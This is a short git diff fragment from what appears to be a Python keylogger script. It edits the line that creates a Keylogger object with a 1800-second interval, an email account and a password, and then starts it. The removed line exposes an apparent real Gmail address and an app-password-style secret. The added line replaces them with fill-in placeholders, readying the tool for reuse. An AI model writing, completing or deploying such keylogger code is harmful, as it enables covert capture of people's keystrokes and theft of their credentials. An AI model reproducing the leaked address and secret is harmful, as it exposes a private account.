@@ -53,7 +53,7 @@ class Keylogger:
 
 
 
-my_keylogger=Keylogger(1800,"hamzahashim515515@gmail.com","pekz tsnt teyt dzql")
+my_keylogger=Keylogger(1800,"your-email@gmail.com","Your password")
 my_keylogger.start()
 
 
